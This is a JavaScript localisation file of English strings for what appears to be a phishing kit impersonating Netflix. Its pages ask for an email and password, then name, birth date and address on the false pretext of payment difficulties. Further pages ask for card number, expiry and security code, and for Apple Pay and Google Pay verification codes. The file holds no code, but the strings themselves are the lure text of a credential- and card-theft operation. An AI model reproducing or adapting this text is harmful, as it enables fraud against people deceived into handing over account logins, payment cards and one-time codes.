export default {
  'nav.signout': 'Sign out',
  'step.of': 'Step {current} of {total}',
  'help.phone': 'Questions? Call {phone}',
  'footer.faq': 'FAQ',
  'footer.privacy': 'Privacy',
  'footer.help': 'Help Center',
  'footer.cookies': 'Cookie Preferences',
  'footer.netflix': 'Netflix Shop',
  'footer.legal': 'Legal Notices',
  'footer.terms': 'Terms of Use',
  'footer.ads': 'Ad Choices',
  'language.french': 'French',
  'language.english': 'English',
  'loading.message': 'Loading...',
  
  // Login Page
  'login.title': 'Sign In',
  'login.email': 'Email or phone number',
  'login.password': 'Password',
  'login.button': 'Sign In',
  'login.remember': 'Remember me',
  'login.help': 'Need help?',
  'login.new': 'New to Netflix?',
  'login.signup': 'Sign up now',
  'login.recaptcha.text': 'This page is protected by Google reCAPTCHA to ensure you\'re not a bot.',
  'login.recaptcha.learn': 'Learn more.',
  'login.recaptcha.privacy': 'The information collected by Google reCAPTCHA is subject to the Google {privacy} and {terms}, and is used for providing, maintaining, and improving the reCAPTCHA service and for general security purposes (it is not used for personalized advertising by Google).',
  'login.recaptcha.privacy.link': 'Privacy Policy',
  'login.recaptcha.terms.link': 'Terms of Service',
  'login.error.email': 'Please enter a valid email address.',
  'login.error.password': 'Your password must contain between 4 and 60 characters.',
  
  // Billing Page
  'billing.title': 'Confirm your billing information',
  'billing.subtitle': 'Due to payment processing difficulties, you need to confirm your billing information.',
  'billing.firstname': 'First name',
  'billing.lastname': 'Last name',
  'billing.dob': 'Date of birth',
  'billing.phone': 'Phone number',
  'billing.address': 'Address',
  'billing.city': 'City',
  'billing.zip': 'ZIP code',
  'billing.continue': 'Continue',
  
  // Payment Page
  'payment.title': 'Confirm your payment method',
  'payment.card.number': 'Card number',
  'payment.card.expiry': 'Expiration date',
  'payment.card.cvv': 'Security code',
  'payment.card.cvv.help': 'The security code is the 3 or 4-digit number on the back of your card.',
  'payment.button': 'VERIFY AND FINISH',
  
  // Failed Payment Page
  'failed.title': 'We can\'t process your payment.',
  'failed.message': 'We\'re having trouble processing your Netflix payment. Please take a moment to update your information and verify your payment details.',
  'failed.button': 'Next',

  // Success Payment Page
  'success.title': 'Payment Successfully Updated',
  'success.message': 'Your payment information has been successfully updated. You can now continue enjoying Netflix without interruption.',
  'success.button': 'Continue to Netflix',

    // Apple Pay Page
    'applepay.title': 'Confirm Apple Pay',
    'applepay.code.label': 'Apple Pay Code',
    'applepay.code.error': 'The code you entered is incorrect. Please try again.',
    'applepay.button': 'Verify',
    'applepay.placeholder': 'Enter verification code',
  
    // Google Pay Page
    'googlepay.title': 'Confirm Google Pay',
    'googlepay.code.label': 'Google Pay Code',
    'googlepay.code.error': 'The code you entered is incorrect. Please try again.',
    'googlepay.button': 'Verify',
    'googlepay.placeholder': 'Enter verification code'
};